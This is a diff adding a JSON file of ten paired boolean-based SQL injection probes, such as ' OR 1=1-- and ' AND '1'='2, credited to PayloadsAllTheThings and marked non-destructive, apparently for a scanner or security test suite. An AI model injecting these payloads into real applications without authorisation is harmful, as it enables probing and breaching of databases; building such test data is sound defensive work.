@@ -1,0 +1,102 @@
+[
+  {
+    "name": "bool_sqli_quoted_and_true",
+    "value": "' AND '1'='1",
+    "kind": "boolean_true",
+    "pair_id": "quoted_and_1",
+    "paired_value": "' AND '1'='2",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  },
+  {
+    "name": "bool_sqli_quoted_and_false",
+    "value": "' AND '1'='2",
+    "kind": "boolean_false",
+    "pair_id": "quoted_and_1",
+    "paired_value": "' AND '1'='1",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  },
+  {
+    "name": "bool_sqli_or_true_comment",
+    "value": "' OR 1=1-- ",
+    "kind": "boolean_true",
+    "pair_id": "or_comment_1",
+    "paired_value": "' OR 1=2-- ",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  },
+  {
+    "name": "bool_sqli_or_false_comment",
+    "value": "' OR 1=2-- ",
+    "kind": "boolean_false",
+    "pair_id": "or_comment_1",
+    "paired_value": "' OR 1=1-- ",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  },
+  {
+    "name": "bool_sqli_numeric_and_true",
+    "value": "1 AND 1=1",
+    "kind": "boolean_true",
+    "pair_id": "numeric_and_1",
+    "paired_value": "1 AND 1=2",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  },
+  {
+    "name": "bool_sqli_numeric_and_false",
+    "value": "1 AND 1=2",
+    "kind": "boolean_false",
+    "pair_id": "numeric_and_1",
+    "paired_value": "1 AND 1=1",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  },
+  {
+    "name": "bool_sqli_double_quote_and_true",
+    "value": "\" AND \"1\"=\"1",
+    "kind": "boolean_true",
+    "pair_id": "dquote_and_1",
+    "paired_value": "\" AND \"1\"=\"2",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  },
+  {
+    "name": "bool_sqli_double_quote_and_false",
+    "value": "\" AND \"1\"=\"2",
+    "kind": "boolean_false",
+    "pair_id": "dquote_and_1",
+    "paired_value": "\" AND \"1\"=\"1",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  },
+  {
+    "name": "bool_sqli_paren_and_true",
+    "value": "') AND ('1'='1",
+    "kind": "boolean_true",
+    "pair_id": "paren_and_1",
+    "paired_value": "') AND ('1'='2",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  },
+  {
+    "name": "bool_sqli_paren_and_false",
+    "value": "') AND ('1'='2",
+    "kind": "boolean_false",
+    "pair_id": "paren_and_1",
+    "paired_value": "') AND ('1'='1",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Boolean-based.md"
+  }
+]
